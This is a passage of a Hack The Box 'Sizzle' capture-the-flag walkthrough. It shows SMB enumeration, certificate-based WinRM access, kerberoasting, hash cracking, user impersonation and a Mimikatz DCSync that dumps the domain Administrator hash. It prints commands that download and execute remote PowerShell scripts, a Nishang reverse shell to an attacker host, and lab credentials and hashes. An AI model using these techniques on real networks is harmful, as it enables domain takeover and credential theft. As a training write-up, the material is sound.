+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           Department Shares READ            
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           Operations                      
+</span></span><span style="display:flex;"><span>SMB         10.129.124.103  <span style="color:#ae81ff">445</span>    SIZZLE           SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>And we definitely found some goodies in <code>CertEnroll</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle/ntlmtheft/openme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.124.103<span style="color:#ae81ff">\\</span>CertEnroll -U amanda%Ashare1972                   
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Tue Feb <span style="color:#ae81ff">25</span> 22:32:44 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Feb <span style="color:#ae81ff">25</span> 22:32:44 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  HTB-SIZZLE-CA+.crl                  A      <span style="color:#ae81ff">721</span>  Tue Feb <span style="color:#ae81ff">25</span> 22:32:44 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  HTB-SIZZLE-CA.crl                   A      <span style="color:#ae81ff">909</span>  Tue Feb <span style="color:#ae81ff">25</span> 22:32:44 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  nsrev_HTB-SIZZLE-CA.asp             A      <span style="color:#ae81ff">322</span>  Mon Jul  <span style="color:#ae81ff">2</span> 16:36:05 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt      A      <span style="color:#ae81ff">871</span>  Mon Jul  <span style="color:#ae81ff">2</span> 16:36:03 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">7779839</span> blocks of size 4096. <span style="color:#ae81ff">3510958</span> blocks available
+</span></span></code></pre></div><p>Seeing this share, and these files, reminds me of the <code>/certsrv</code> endpoint we found on the web server earlier. Let&rsquo;s revisit.</p>
+<h3 id="certificate-server">Certificate Server</h3>
+<p><img src="/images/sizzle4.png" alt="sizzle4"></p>
+<p>Let&rsquo;s request a certificate, and then select &ldquo;advanced certificate request&rdquo;.</p>
+<p><img src="/images/sizzle5.png" alt="sizzle5"></p>
+<p>We can run the following command to generate a new certificate signing request and subsequent key, then paste the generated <code>.csr</code> into our web portal to grab a valid certificate from the server.</p>
+<p><img src="/images/sizzle6.png" alt="sizzle6"></p>
+<p>Now we can use this certificate to hopefully take advantage of Amanda&rsquo;s <code>CanPSRemote</code> permission.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -c certnew.cer -k pl4stic.key -i 10.129.124.103 -u amanda -p Ashare1972 -S
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: SSL enabled
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>manda<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><h2 id="shell-as-amanda">Shell as Amanda</h2>
+<h3 id="check-spn-accounts">Check SPN Accounts</h3>
+<p>Now that we have shell access as Amanda, we can begin to enumerate the machine for any juicy nuggets. I tried a few things, but then had success in searching for kerberoastable accounts by checking to see which accounts were in use as SPN. Looks like we might be able to run a kerberoast on <code>mrlky</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\amanda\Documents&gt; setspn -T htb.local -Q */*
+</span></span><span style="display:flex;"><span>Checking domain DC=HTB,DC=LOCAL
+</span></span><span style="display:flex;"><span>CN=SIZZLE,OU=Domain Controllers,DC=HTB,DC=LOCAL
+</span></span><span style="display:flex;"><span>        Dfsr-12F9A27C-BF97-<span style="color:#ae81ff">4787</span>-<span style="color:#ae81ff">9364</span>-D31B6C55EB04/sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        ldap/sizzle.HTB.LOCAL/ForestDnsZones.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        ldap/sizzle.HTB.LOCAL/DomainDnsZones.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        DNS/sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        GC/sizzle.HTB.LOCAL/HTB.LOCAL
+</span></span><span style="display:flex;"><span>        RestrictedKrbHost/sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        RestrictedKrbHost/SIZZLE
+</span></span><span style="display:flex;"><span>        RPC/717ef311-<span style="color:#ae81ff">0653</span>-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        HOST/SIZZLE/HTB
+</span></span><span style="display:flex;"><span>        HOST/sizzle.HTB.LOCAL/HTB
+</span></span><span style="display:flex;"><span>        HOST/SIZZLE
+</span></span><span style="display:flex;"><span>        HOST/sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        HOST/sizzle.HTB.LOCAL/HTB.LOCAL
+</span></span><span style="display:flex;"><span>        E3514235-4B06-11D1-AB04-00C04FC2DCD2/717ef311-<span style="color:#ae81ff">0653</span>-41c6-8db6-81526d6f4985/HTB.LOCAL
+</span></span><span style="display:flex;"><span>        ldap/SIZZLE/HTB
+</span></span><span style="display:flex;"><span>        ldap/717ef311-<span style="color:#ae81ff">0653</span>-41c6-8db6-81526d6f4985._msdcs.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        ldap/sizzle.HTB.LOCAL/HTB
+</span></span><span style="display:flex;"><span>        ldap/SIZZLE
+</span></span><span style="display:flex;"><span>        ldap/sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>        ldap/sizzle.HTB.LOCAL/HTB.LOCAL
+</span></span><span style="display:flex;"><span>CN=krbtgt,CN=Users,DC=HTB,DC=LOCAL
+</span></span><span style="display:flex;"><span>        kadmin/changepw
+</span></span><span style="display:flex;"><span>CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+</span></span><span style="display:flex;"><span>        http/sizzle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Existing SPN found!
+</span></span></code></pre></div><h3 id="kerberoast-mrlky">Kerberoast: mrlky</h3>
+<p>Trying to get <code>PowerView.ps1</code> on the system is proving to be difficult, as we&rsquo;re currently under a constrained language mode.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\amanda\Documents&gt; IEX(New-Object Net.Webclient).downloadString(<span style="color:#e6db74">&#39;http://10.10.16.72/PowerView.ps1&#39;</span>)
+</span></span><span style="display:flex;"><span>Cannot create type. Only core types are supported <span style="color:#66d9ef">in</span> this language mode.
+</span></span><span style="display:flex;"><span>At line<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span> char<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>+ IEX(New-Object Net.Webclient).downloadString(<span style="color:#960050;background-color:#1e0010">&#39;</span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">72</span>/Powe ...
+</span></span><span style="display:flex;"><span>+     ~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> PermissionDenied<span style="color:#960050;background-color:#1e0010">:</span> (<span style="color:#960050;background-color:#1e0010">:</span>) [New-Object], PSNotSupportedException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommand
+</span></span></code></pre></div><p>Let&rsquo;s try a workaround using the Nishang reverse shell and some PowerShell trickery. Don&rsquo;t forget to edit your shell script and add a line at the bottom so it not only loads the modules, but also calls your reverse shell&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress <span style="color:#ae81ff">10.10</span>.14.142 -Port <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>manda<span style="color:#ae81ff">\D</span>ocuments&gt; wget http://10.10.14.142/shell.ps1 -OutFile shell.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>manda<span style="color:#ae81ff">\D</span>ocuments&gt; powershell -v <span style="color:#ae81ff">2</span> -ExecutionPolicy Bypass .<span style="color:#ae81ff">\s</span>hell.ps1
+</span></span></code></pre></div><p>Now we should be able to load <code>PowerView.ps1</code> and execute its functions. In this case, we want to utilize <code>Invoke-Kerberoast</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt;IEX(New-Object Net.Webclient).downloadString(<span style="color:#e6db74">&#39;http://10.10.14.142/PowerView.ps1&#39;</span>)   
+</span></span><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt; $SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;Ashare1972&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt; $Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;HTB.LOCAL\amanda&#39;</span>, $SecPassword)
+</span></span><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt; Invoke-Kerberoast -Credential $Cred -Verbose | fl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SamAccountName       <span style="color:#960050;background-color:#1e0010">:</span> mrlky
+</span></span><span style="display:flex;"><span>DistinguishedName    <span style="color:#960050;background-color:#1e0010">:</span> CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+</span></span><span style="display:flex;"><span>ServicePrincipalName <span style="color:#960050;background-color:#1e0010">:</span> http/sizzle
+</span></span><span style="display:flex;"><span>TicketByteHexStream  <span style="color:#960050;background-color:#1e0010">:</span> 
+</span></span><span style="display:flex;"><span>Hash                 <span style="color:#960050;background-color:#1e0010">:</span> $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$75E173DA4709D562130584227CA4F1EE$
+</span></span><span style="display:flex;"><span>                       FDF6AB981CE096ADC09C3254D911E46457C918AF70D96C807EFA8EE36A98D407BAF8BD7EC60
+</span></span><span style="display:flex;"><span>                       0664A85B971C9800D94BD8F556F8C6BA66670F6EEEBBC5CF7249C0B0BA189963F9AF0635878
+</span></span><span style="display:flex;"><span>                       0918E4CBA7093A5338CA7E8F969FDA17312B7B872F61F71AD00ED02B8510433E09C20CD8B40
+</span></span><span style="display:flex;"><span>                       D0BB156A2B85246584A015063F2763C8D07ACF3B6601DABB3990BDAE787F4A860BAD6A97760
+</span></span><span style="display:flex;"><span>                       D0C2422258AFB339708B43431F329AE42F856301E2AD4090A5B3169D9AEADC921E3001B02B6
+</span></span><span style="display:flex;"><span>                       B9ADA093AC9C9AC1572E0461D736A787D8E0BE9CD018701D2C0DDCDB292CBFD7072F8FBEAFB
+</span></span><span style="display:flex;"><span>                       52E371FCF543642D6CC8BA401E6900E2AB8D061B6625C2125313800D70C4F4F9D49C70AA26C
+</span></span><span style="display:flex;"><span>                       DDD8E94CFBC78B3E6195986C0A5B923EDAE57DF46AD558C41CA2A96F545F361CE46153005F4
+</span></span><span style="display:flex;"><span>                       10EC8A51D664E857B9BFD6F7638A674AD68FC75FCE6CC4CFDBF419F34D4FB3F6DD133E231DA
+</span></span><span style="display:flex;"><span>                       9AC7AF6BADFC6CE47FDD9FF7D44F33C369EB19CD88B96405F306CFD7E8595F7FC93C862D47D
+</span></span><span style="display:flex;"><span>                       14F64374D2BA47FC2BF7F8AFC849D44A0C5F4E81CAD6BA2A8E05E8FAAE92D1DB39C9D1F4AB5
+</span></span><span style="display:flex;"><span>                       2C92920C921E88E011F2EC7054F6510FF67EE526BE8202AE8CF5FB6A51BF455DC4AC072836E
+</span></span><span style="display:flex;"><span>                       9ECA7C2629C09B578108350182958444836719FF0A953E63BA56D6EB7646DC16B3FBC8EA7D9
+</span></span><span style="display:flex;"><span>                       96203867D985300DFF8A31C6E4DDF2BB5709F1820B0351309B8DDC7BC7F34F1CA0A74080726
+</span></span><span style="display:flex;"><span>                       2223BFE15ED6222D4CCEED2AD54D398215B422BFFD844B5F7D24E787DE27C2376B89C068287
+</span></span><span style="display:flex;"><span>                       B032DB4B92DD54DEB9BF5A405424D0A92ECB70F073CA29311B5526B32769CE351A3E03F2441
+</span></span><span style="display:flex;"><span>                       DF47636AB0AEE58BF0E53FCE31AC9EA49D652B1F730C3F1C025DA3280A76ED48A44B8FF2888
+</span></span><span style="display:flex;"><span>                       52D24FE72D8CC6A75B7D7AA4C813071B03A0368898340C9FAC99123040C0A312FD00D120B08
+</span></span><span style="display:flex;"><span>                       5F864710746109EC47DF98ED4BC30747508A70E7EB73426CA45D27308F8BDB80AA88734093C
+</span></span><span style="display:flex;"><span>                       4C32DF27797F1FBA070506480B39E30BD532D388D9372CB7364BB75AC84D6F6977E0AA862D9
+</span></span><span style="display:flex;"><span>                       FA53F98FBF6A74C6AC9D687D96F8C4736519245667D147AFE83F821651F19E06F29F6ECF07D
+</span></span><span style="display:flex;"><span>                       85FAE9A8A52F33FD9E438505A2B4F3AA5D32713CC41D45655169AD9E8312EA597AD95A1C97F
+</span></span><span style="display:flex;"><span>                       8FB5661A273D1C221D637C3C489212A2F2421E964EF84AA0FC03E6797655284DA3EC8527A4B
+</span></span><span style="display:flex;"><span>                       66E5578EA92B8A64F894077E07B73045025216C8169143BB7EF5D8B7F6E1AF75B3EF60704D8
+</span></span><span style="display:flex;"><span>                       2654CECF944B65284A36C311F250C2259420440A5223D5342A78C2FEDBAA5AD153629E42E7F
+</span></span><span style="display:flex;"><span>                       F72A213862401999E711701025207D4BB9F6666CDE8B5D478EFA9239E2B26DCF4584FEE225B
+</span></span><span style="display:flex;"><span>                       807CEDAB672303313B82310687B967E50957EC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt;
+</span></span></code></pre></div><h3 id="hash-crack">Hash Crack</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat mrlky-hash.txt /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$75e173da4709d562130584227ca4f1ee$fdf6ab981ce096adc09c3254d911e46457c918af70d96c807efa8ee36a98d407baf8bd7ec600664a85b971c9800d94bd8f556f8c6ba66670f6eeebbc5cf7249c0b0ba189963f9af06358780918e4cba7093a5338ca7e8f969fda17312b7b872f61f71ad00ed02b8510433e09c20cd8b40d0bb156a2b85246584a015063f2763c8d07acf3b6601dabb3990bdae787f4a860bad6a97760d0c2422258afb339708b43431f329ae42f856301e2ad4090a5b3169d9aeadc921e3001b02b6b9ada093ac9c9ac1572e0461d736a787d8e0be9cd018701d2c0ddcdb292cbfd7072f8fbeafb52e371fcf543642d6cc8ba401e6900e2ab8d061b6625c2125313800d70c4f4f9d49c70aa26cddd8e94cfbc78b3e6195986c0a5b923edae57df46ad558c41ca2a96f545f361ce46153005f410ec8a51d664e857b9bfd6f7638a674ad68fc75fce6cc4cfdbf419f34d4fb3f6dd133e231da9ac7af6badfc6ce47fdd9ff7d44f33c369eb19cd88b96405f306cfd7e8595f7fc93c862d47d14f64374d2ba47fc2bf7f8afc849d44a0c5f4e81cad6ba2a8e05e8faae92d1db39c9d1f4ab52c92920c921e88e011f2ec7054f6510ff67ee526be8202ae8cf5fb6a51bf455dc4ac072836e9eca7c2629c09b578108350182958444836719ff0a953e63ba56d6eb7646dc16b3fbc8ea7d996203867d985300dff8a31c6e4ddf2bb5709f1820b0351309b8ddc7bc7f34f1ca0a740807262223bfe15ed6222d4cceed2ad54d398215b422bffd844b5f7d24e787de27c2376b89c068287b032db4b92dd54deb9bf5a405424d0a92ecb70f073ca29311b5526b32769ce351a3e03f2441df47636ab0aee58bf0e53fce31ac9ea49d652b1f730c3f1c025da3280a76ed48a44b8ff288852d24fe72d8cc6a75b7d7aa4c813071b03a0368898340c9fac99123040c0a312fd00d120b085f864710746109ec47df98ed4bc30747508a70e7eb73426ca45d27308f8bdb80aa88734093c4c32df27797f1fba070506480b39e30bd532d388d9372cb7364bb75ac84d6f6977e0aa862d9fa53f98fbf6a74c6ac9d687d96f8c4736519245667d147afe83f821651f19e06f29f6ecf07d85fae9a8a52f33fd9e438505a2b4f3aa5d32713cc41d45655169ad9e8312ea597ad95a1c97f8fb5661a273d1c221d637c3c489212a2f2421e964ef84aa0fc03e6797655284da3ec8527a4b66e5578ea92b8a64f894077e07b73045025216c8169143bb7ef5d8b7f6e1af75b3ef60704d82654cecf944b65284a36c311f250c2259420440a5223d5342a78c2fedbaa5ad153629e42e7ff72a213862401999e711701025207d4bb9f6666cde8b5d478efa9239e2b26dcf4584fee225b807cedab672303313b82310687b967e50957ec:Football#7
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">13100</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, TGS-REP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$75e173da4...0957ec
+</span></span><span style="display:flex;"><span>Time.Started.....: Wed Feb <span style="color:#ae81ff">26</span> 00:23:27 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Wed Feb <span style="color:#ae81ff">26</span> 00:23:31 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>And now we&rsquo;ve got a new set of credentials: <code>HTB.local\mrlky:Football#7</code></p>
+<h3 id="impersonate-mrlky">Impersonate mrlky</h3>
+<p>I wasn&rsquo;t able to use <code>mrlky</code>&rsquo;s credentials to connect to the machine with WinRM, or the other standard methods such as PSExec, WMIExec, etc.  Let&rsquo;s use another PowerShell script to change user to <code>mrlky</code> by impersonating him as Amanda. <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Impersonaliza-User.ps1" target="_blank">Script here</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt;IEX(New-Object Net.Webclient).downloadString(<span style="color:#e6db74">&#39;http://10.10.14.142/Impersonaliza-User.ps1&#39;</span>)
+</span></span><span style="display:flex;"><span>PS C:\Users\amanda\Documents&gt; Impersonaliza-User -usuario mrlky -password Football<span style="color:#75715e">#7 -dominio HTB.LOCAL</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>True
+</span></span></code></pre></div><p>Don&rsquo;t forget to grab <code>user.txt</code> from <code>C:\Users\mrlky\Desktop</code></p>
+<h2 id="shell-as-mrlky">Shell as mrlky</h2>
+<p><img src="/images/sizzle7.png" alt="sizzle7"></p>
+<p>Let&rsquo;s take a look back at Bloodhound and see what <code>mrlky</code> can do on the domain. With the <code>DCSync</code> permissions, BloodHound gives us the path to privilege escalation. Looks easy enough&hellip; <code>mimikatz</code> for the win!</p>
+<p><img src="/images/sizzle8.png" alt="sizzle8"></p>
+<p>We&rsquo;ll use <code>Invoke-Mimikatz.ps1</code>, found <a href="https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank">here</a>, for this one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>PS C:\Users\mrlky\Desktop&gt; IEX(New-Object Net.Webclient).downloadString(<span style="color:#e6db74">&#39;http://10.10.14.142/Invoke-Mimikatz.ps1&#39;</span>)
+</span></span><span style="display:flex;"><span>PS C:\Users\mrlky\Desktop&gt; Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;Lsadump::dcsync /domain:HTB.LOCAL /user:Administrator&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .<span style="color:#75715e">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14</span>
+</span></span><span style="display:flex;"><span> .<span style="color:#75715e">## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## / \ ##  /* * *</span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;## v ##&#39;</span>   http<span style="color:#960050;background-color:#1e0010">:</span>//blog.gentilkiwi.com/mimikatz             (oe.eo)
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;#####&#39;</span>                                     with <span style="color:#ae81ff">20</span> modules * * */
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mimikatz(powershell) <span style="color:#75715e"># Lsadump::dcsync /domain:HTB.LOCAL /user:Administrator</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">DC</span>] <span style="color:#e6db74">&#39;HTB.LOCAL&#39;</span> will be the domain
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">DC</span>] <span style="color:#e6db74">&#39;sizzle.HTB.LOCAL&#39;</span> will be the DC server
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">DC</span>] <span style="color:#e6db74">&#39;Administrator&#39;</span> will be the user account
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Object RDN           <span style="color:#960050;background-color:#1e0010">:</span> Administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>** SAM ACCOUNT **
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SAM Username         <span style="color:#960050;background-color:#1e0010">:</span> Administrator
+</span></span><span style="display:flex;"><span>Account Type         <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">30000000</span> ( USER_OBJECT )
+</span></span><span style="display:flex;"><span>User Account Control <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">00000200</span> ( NORMAL_ACCOUNT )
+</span></span><span style="display:flex;"><span>Account expiration   <span style="color:#960050;background-color:#1e0010">:</span> 
+</span></span><span style="display:flex;"><span>Password last change <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">7</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">2018</span> <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">32</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">41</span> PM
+</span></span><span style="display:flex;"><span>Object Security ID   <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2379389067</span>-<span style="color:#ae81ff">1826974543</span>-<span style="color:#ae81ff">3574127760</span>-<span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>Object Relative ID   <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Credentials<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>  Hash NTLM<span style="color:#960050;background-color:#1e0010">:</span> f6b7160bfc91823792e0ac3a162c9267
+</span></span><span style="display:flex;"><span>    ntlm- <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span> f6b7160bfc91823792e0ac3a162c9267
+</span></span><span style="display:flex;"><span>    ntlm- <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span> c718f548c75062ada93250db208d3178
+</span></span><span style="display:flex;"><span>    lm  - <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span> 336d863559a3f7e69371a85ad959a675
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[...snip...]
+</span></span></code></pre></div><h2 id="shell-as-administrator">Shell as Administrator</h2>
+<p>Now that we have the administrator hash, we can dump the NTLM and then login using <code>wmiexec</code> and grab the <code>root.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump htb.local/administrator@10.129.124.103 -hashes :f6b7160bfc91823792e0ac3a162c9267 -just-dc-ntlm
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
